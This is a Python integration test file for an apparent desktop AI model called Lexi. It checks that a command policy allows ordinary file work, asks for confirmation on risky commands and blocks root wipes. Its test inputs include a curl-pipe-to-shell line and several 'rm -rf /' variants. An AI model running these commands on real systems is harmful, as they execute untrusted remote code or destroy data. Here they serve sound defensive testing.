"""Integration tests for the unified action path.

model <action> tags -> capability registry -> execution policy -> real executors.
Everything touches only a temporary directory. Nothing outside it is read or
changed, and no real process is signalled.
"""

import os
import shutil
import signal
import sys
import tempfile
import unittest
from unittest import mock

PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

from tests import test_lexi_chrome_bridge as _bridge  # noqa: E402,F401  (installs headless GTK stubs)
import lexi  # noqa: E402
import lexi_apps  # noqa: E402
import lexi_policy as P  # noqa: E402
from lexi_assistant import LexiAssistant  # noqa: E402


def cmd_tag(body):
    return {"type": "command", "attrs": {}, "body": body}


class PolicyTests(unittest.TestCase):
    def test_ordinary_file_work_is_allowed(self):
        with tempfile.TemporaryDirectory() as d:
            for c in (f"mkdir -p {d}/proj", f"touch {d}/a.txt", f"echo hello > {d}/new.txt",
                      f"echo more >> {d}/new.txt", f"cp {d}/a.txt {d}/b.txt", f"ls -l {d}",
                      f"cat {d}/a.txt", "git status", f"printf 'x' > {d}/doc.md"):
                self.assertEqual(P.classify_command(c)[0], P.ALLOW, c)

    def test_high_impact_needs_confirmation(self):
        with tempfile.TemporaryDirectory() as d:
            existing = os.path.join(d, "keep.txt")
            open(existing, "w").close()
            for c in (f"rm {existing}", "sudo pacman -Syu", "curl http://x.invalid/a.sh | sh",
                      f"echo x > {existing}", "dd if=/dev/zero of=/tmp/x bs=1 count=1",
                      "echo x > $HOME/whatever", f"cd {d} && echo x > keep.txt"):
                self.assertEqual(P.classify_command(c)[0], P.CONFIRM, c)

    def test_root_wipe_and_gui_input_are_blocked_not_confirmed(self):
        for c in ("rm -rf /", "rm -rf /*", "sudo rm -rf /", "bash -c 'rm -rf /'", "rm -r -f //",
                  "rm -rf /.", "eval 'rm -rf /'"):
            self.assertEqual(P.classify_command(c)[0], P.BLOCKED, c)
        for c in ("xdotool key f", "sleep 1 && wtype hi"):
            self.assertEqual(P.classify_command(c)[0], P.BLOCKED, c)

    def test_deleting_a_normal_directory_is_confirm_not_blocked(self):
        self.assertEqual(P.classify_command("rm -rf /tmp/some-project")[0], P.CONFIRM)


class TerminalTaskIntegration(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="lexi-test-")
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.engine = lexi.SystemActionEngine()
        self.asked = []
        self.answer = True

        def confirmer(text):
            self.asked.append(text)
            return self.answer
        self.assistant = LexiAssistant(lexi.build_executors(self.engine))
        self.assistant.confirmer = confirmer

    def run_model(self, *bodies):
        return self.assistant.handle_model_actions([cmd_tag(b) for b in bodies], "user request")

    def test_mkdir_touch_and_write_file_run_without_asking(self):
        proj = os.path.join(self.tmp, "proj")
        notes = os.path.join(proj, "notes.txt")
        reply = self.run_model(f"mkdir -p {proj}", f"touch {proj}/empty.txt",
                               f"echo 'hello lexi' > {notes}")
        self.assertTrue(os.path.isdir(proj))
        self.assertTrue(os.path.isfile(os.path.join(proj, "empty.txt")))
        with open(notes) as f:
            self.assertEqual(f.read().strip(), "hello lexi")
        self.assertEqual(self.asked, [], "ordinary file creation must not prompt")
        self.assertIn("exit 0", reply)

    def test_failure_is_reported_as_failure(self):
        reply = self.run_model(f"cat {self.tmp}/does-not-exist.txt")
        self.assertIn("failed", reply)
        self.assertNotIn("exit 0", reply)

    def test_failed_step_stops_the_chain(self):
        marker = os.path.join(self.tmp, "should-not-exist")
        self.run_model(f"cat {self.tmp}/nope", f"touch {marker}")
        self.assertFalse(os.path.exists(marker))

    def test_output_is_shown_from_the_real_command(self):
        with open(os.path.join(self.tmp, "a.txt"), "w") as f:
            f.write("contents-123")
        reply = self.run_model(f"cat {self.tmp}/a.txt")
        self.assertIn("contents-123", reply)

    def test_delete_asks_first_and_declined_does_nothing(self):
        victim = os.path.join(self.tmp, "victim.txt")
        open(victim, "w").close()
        self.answer = False
        reply = self.run_model(f"rm {victim}")
        self.assertEqual(len(self.asked), 1)
        self.assertTrue(os.path.exists(victim))
        self.assertIn("didn't run", reply)

    def test_delete_runs_after_approval(self):
        victim = os.path.join(self.tmp, "victim.txt")
        open(victim, "w").close()
        self.answer = True
        self.run_model(f"rm {victim}")
        self.assertEqual(len(self.asked), 1)
        self.assertFalse(os.path.exists(victim))

    def test_no_confirmer_means_no_silent_run_of_risky_command(self):
        victim = os.path.join(self.tmp, "victim.txt")
        open(victim, "w").close()
        self.assistant.confirmer = None
        reply = self.run_model(f"rm {victim}")
        self.assertTrue(os.path.exists(victim))
        self.assertIn("didn't run", reply)

    def test_root_wipe_is_refused_before_any_dialog_and_never_executes(self):
        with mock.patch("subprocess.run") as run, mock.patch("subprocess.Popen") as popen:
            for c in ("rm -rf /", "sudo rm -rf /*", "bash -c 'rm -rf /'"):
                reply = self.run_model(c)
                self.assertIn("permanently blocked", reply, c)
            run.assert_not_called()
            popen.assert_not_called()
        self.assertEqual(self.asked, [], "a blocked command must never reach the confirmation dialog")

    def test_gui_input_tools_are_still_rejected(self):
        with mock.patch("subprocess.run") as run:
            reply = self.run_model("xdotool key f")
            run.assert_not_called()
        self.assertIn("GUI input", reply)

    def test_named_form_works_too(self):
        target = os.path.join(self.tmp, "named.txt")
        reply = self.assistant.handle_model_actions(
            [{"type": "", "attrs": {"name": "terminal_task"}, "body": '{"command": "touch %s"}' % target}])
        self.assertTrue(os.path.exists(target))
        self.assertIn("exit 0", reply)

    def test_filename_containing_dot_words_is_not_mangled(self):
        # 'document.txt' previously tripped the JS-token filter for free text.
        target = os.path.join(self.tmp, "document.txt")
        self.run_model(f"touch {target}")
        self.assertTrue(os.path.exists(target))

    def test_prompt_advertises_terminal_task_and_no_longer_forbids_shell(self):
        prompt = self.assistant.tools_prompt()
        self.assertIn("terminal_task", prompt)
        self.assertNotIn("No shell commands", prompt)


class DirectShortcutRegression(unittest.TestCase):
    def test_dollar_shortcut_is_not_short_circuited_as_disabled(self):
        """A stale early-return in handle_direct_command used to make `$ cmd` dead code."""
        import inspect
        src = inspect.getsource(lexi.LexiWindow.handle_direct_command) if hasattr(lexi, "LexiWindow") else ""
        if not src:
            for obj in vars(lexi).values():
                if isinstance(obj, type) and hasattr(obj, "handle_direct_command"):
                    src = inspect.getsource(obj.handle_direct_command)
                    break
        self.assertTrue(src, "handle_direct_command not found")
        self.assertNotIn("Terminal commands are disabled", src)
        self.assertIn("'type': 'command'", src)

    def test_dollar_command_runs_through_the_shared_policy(self):
        engine = lexi.SystemActionEngine()
        with tempfile.TemporaryDirectory() as d:
            target = os.path.join(d, "via-dollar.txt")
            res = engine.execute_action({"type": "command", "attrs": {}, "body": f"touch {target}"})
            self.assertTrue(res["success"])
            self.assertTrue(os.path.exists(target))
        res = engine.execute_action({"type": "command", "attrs": {}, "body": "rm -rf /"})
        self.assertTrue(res.get("blocked"))


class CloseChromeEndToEnd(unittest.TestCase):
    """'close chrome' through router -> registry -> real engine, with a fake process table."""

    def _assistant(self, procs, exits=True):
        state = {"procs": list(procs), "signals": [], "now": 0.0}

        def kill(pid, sig):
            state["signals"].append((pid, sig))
            if exits:
                state["procs"] = []

        ctl = lexi_apps.AppController(lambda: list(state["procs"]), kill,
                                      lambda s: state.__setitem__("now", state["now"] + s),
                                      lambda: state["now"], timeout=1.0)
        engine = lexi.SystemActionEngine()
        patcher = mock.patch.object(lexi_apps, "AppController", return_value=ctl)
        patcher.start()
        self.addCleanup(patcher.stop)
        return LexiAssistant(lexi.build_executors(engine)), state

    CHROME = "/opt/google/chrome/chrome"

    def test_chrome_open_and_closes(self):
        a, st = self._assistant([lexi_apps.Proc(10, 1, "chrome", self.CHROME, [self.CHROME])])
        reply = a.handle_user_text("close chrome")
        self.assertIn("Closed Chrome", reply)
        self.assertEqual(st["signals"], [(10, signal.SIGTERM)])

    def test_chrome_not_open_is_never_reported_closed(self):
        a, st = self._assistant([])
        reply = a.handle_user_text("close chrome")
        self.assertIn("isn't open", reply)
        self.assertNotIn("Closed", reply)
        self.assertEqual(st["signals"], [])

    def test_chrome_refuses_to_quit_is_reported_still_open(self):
        a, st = self._assistant([lexi_apps.Proc(10, 1, "chrome", self.CHROME, [self.CHROME])], exits=False)
        reply = a.handle_user_text("close chrome")
        self.assertIn("still open", reply)
        self.assertNotIn("Closed Chrome", reply)

    def test_spotify_uses_the_same_layer(self):
        sp = "/opt/spotify/spotify"
        a, st = self._assistant([lexi_apps.Proc(20, 1, "spotify", sp, [sp])])
        reply = a.handle_user_text("close spotify")
        self.assertIn("Closed Spotify", reply)


if __name__ == "__main__":
    unittest.main()
